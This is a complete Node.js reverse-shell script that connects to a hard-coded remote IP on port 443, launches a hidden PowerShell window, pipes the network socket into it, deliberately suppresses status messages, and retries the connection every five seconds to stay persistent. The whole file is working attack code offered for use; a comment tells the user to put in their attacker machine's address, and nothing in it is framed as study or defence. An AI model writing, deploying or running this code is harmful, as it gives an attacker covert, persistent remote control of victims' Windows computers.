const { spawn } = require('child_process');
const net = require('net');
const address = '82.9.14.4'; // Change this to your attacker machine's IP address
const port = 443;

function connectToListener() {
    const client = net.connect(port, address, () => {
        // Do not display connection message
        const powershell = spawn('powershell.exe', ['-NoExit', '-WindowStyle', 'Hidden', '-Command', '-']);

        client.pipe(powershell.stdin);
        powershell.stdout.pipe(client);
        powershell.stderr.pipe(client);

        powershell.on('exit', () => {
            // No need to display disconnection message
            client.end();
        });
    });

    client.on('error', (err) => {
        console.error('Error:', err);
        setTimeout(connectToListener, 5000); // Retry connection after 5 seconds
    });

    client.on('close', () => {
        setTimeout(connectToListener, 5000); // Retry connection after 5 seconds
    });
}

connectToListener();